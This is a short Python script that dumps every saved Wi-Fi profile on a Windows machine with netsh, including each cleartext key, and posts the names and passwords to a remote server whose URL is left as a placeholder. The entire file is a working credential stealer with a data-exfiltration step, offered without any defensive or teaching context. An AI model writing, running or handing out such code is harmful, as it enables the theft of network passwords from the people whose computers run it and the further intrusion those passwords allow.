import subprocess
import requests
import os

try:
    from subprocess import DEVNULL
except ImportError:
    DEVNULL = os.open(os.devnull, os.O_RDWR)

url = "url" #add url
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], stdin=DEVNULL, stderr=DEVNULL).decode('utf-8',
                                                                                                            errors="backslashreplace").split(
    '\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

res = {}

for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], stdin=DEVNULL,
                                      stderr=DEVNULL).decode('utf-8', errors="backslashreplace").split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    res[i] = results[0]

m = ""
for key in res:
    m += "{}  :  {}\n\n".format(key, res[key])

#send to server
requests.post(url=url + m)
